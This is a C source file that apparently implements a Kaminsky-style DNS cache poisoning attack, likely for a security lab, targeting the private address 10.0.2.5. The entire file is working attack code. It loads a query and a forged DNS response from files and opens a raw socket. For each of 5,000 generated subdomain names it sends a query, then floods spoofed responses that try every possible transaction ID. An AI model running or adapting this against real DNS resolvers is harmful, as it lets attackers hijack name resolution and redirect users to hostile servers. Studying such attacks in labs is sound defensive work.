#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "myheader.h"

void spoof(int cnt_start, int cnt_end)
{
  int sd;
  struct sockaddr_in dest;

  // Reading query packet from file
  FILE *f_query = fopen("query.bin", "rb");
  if (!f_query) {
    perror("Cannot open 'query.bin'.");
    exit(0);
  }
  unsigned char query[4096];
  memset(query, 0, 4096);
  int n_req = fread(query, 1, 4096, f_query);

  // Reading query response from file
  FILE *f_resp = fopen("response.bin", "rb");
  if (!f_resp) {
    perror("Cannot open 'response.bin'.");
    exit(0);
  }
  unsigned char resp[4096];
  memset(resp, 0, 4096);
  int n_res = fread(resp, 1, 4096, f_resp);

  // Create a new socket and set the destination address  
  sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sd < 0) {
    perror("socket() error");
    exit(-1);
  }

  dest.sin_family = AF_INET;
  dest.sin_addr.s_addr = inet_addr("10.0.2.5");
 
  // Spoof packets
  char name[5]; 
  for (int cnt = cnt_start;cnt < cnt_end; ++ cnt) {
    name[0] = 'a' + (cnt / 10000)  % 10;
    name[1] = 'a' + (cnt / 1000)  % 10;
    name[2] = 'a' + (cnt / 100)  % 10;
    name[3] = 'a' + (cnt / 10)  % 10;
    name[4] = 'a' + cnt  % 10;

    memcpy(query + 26, "\0\0", 2);
    memcpy(query + 41, (const char*)name, 5);
    if (sendto(sd, query, n_req, 0, 
	(struct sockaddr *) &dest, sizeof(dest)) < 0) {
      perror("query sendto() error"); 
      exit(-1);
    }

    memcpy(resp + 26, "\0\0", 2);
    memcpy(resp + 41, (const char*)name, 5);
    memcpy(resp + 64, (const char*)name, 5);
    for (int id = 0x0;id < 0x10000; ++id) {
      unsigned short transaction_id = htons(id);	 
      memcpy(resp + 28, (void *)&transaction_id, 2);

      if (sendto(sd, resp, n_res, 0, 
	  (struct sockaddr *) &dest, sizeof(dest)) < 0) {
        perror("resp sendto() error"); 
        exit(-1);
      }
    }
  }

  close(sd);
}

int main(int argc, char* argv[])
{
  spoof(0, 5000);

  return 0;
}
